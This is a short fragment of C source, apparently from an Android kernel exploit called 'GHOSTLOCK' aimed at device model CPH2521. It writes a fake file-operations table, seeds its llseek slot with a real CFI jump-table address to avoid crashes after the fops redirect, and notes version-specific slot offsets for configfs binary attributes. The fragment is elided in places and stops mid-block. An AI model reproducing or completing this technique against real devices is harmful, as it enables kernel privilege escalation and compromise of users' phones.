...
void put_fake_fops_table(unsigned char *p, size_t off) {
  ...
  /*
   * CPH2521: start with real noop_llseek.cfi_jt. The old Ace pattern
   * (llseek = W0+pi_tree) softboots if anything seeks after fops redirect
   * before repair_fake_fops_llseek runs. repair_ still rewrites the slot.
   */
  put64(p, off + FOPS_LLSEEK_OFF,
        runtime_text_sym(a_llseek, NOOP_LLSEEK_OFF));
#ifdef GHOSTLOCK_KERNEL_5_10
  /*
   * 5.10 configfs bin attrs use .read/.write (not *_iter). On CPH2521 those
   * slots are +0x10/+0x18 (Android fops + mmap_supported_flags). Values must
   * be *.cfi_jt addresses from the real configfs_bin_file_operations table.
   */
